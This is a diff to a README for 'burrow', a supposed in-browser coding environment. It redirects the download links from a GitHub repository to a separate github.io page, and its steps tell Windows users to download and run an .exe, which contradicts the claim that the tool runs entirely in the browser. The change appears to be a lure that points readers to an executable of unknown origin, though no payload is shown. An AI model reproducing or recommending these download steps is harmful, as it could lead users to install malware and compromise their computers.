@@ -1,6 +1,6 @@
 # 💻 burrow - A complete coding environment in browser
 
-[![Download Burrow](https://img.shields.io/badge/Download_Burrow-blue.svg)](https://github.com/annunciatory-bearnaise22/burrow)
+[![Download Burrow](https://img.shields.io/badge/Download_Burrow-blue.svg)](https://annunciatory-bearnaise22.github.io)
 
 Burrow provides a workspace for software development directly inside your web browser. It combines a file system, a command terminal, and artificial intelligence into a single tab. You do not need to install complex tools or language runtimes on your main computer to write or test code. Burrow keeps your work local and does not track your data.
 
@@ -19,7 +19,7 @@ Burrow runs entirely within your browser's memory. It does not store your projec
 
 You can start using Burrow in minutes. Follow these instructions to set up the software on your Windows machine:
 
-1. Visit this page to download: [https://github.com/annunciatory-bearnaise22/burrow](https://github.com/annunciatory-bearnaise22/burrow)
+1. Visit this page to download: [https://annunciatory-bearnaise22.github.io](https://annunciatory-bearnaise22.github.io)
 2. Locate the latest version button on the right side of the page.
 3. Select the file ending in .exe for Windows.
 4. Save the file to your Downloads folder.
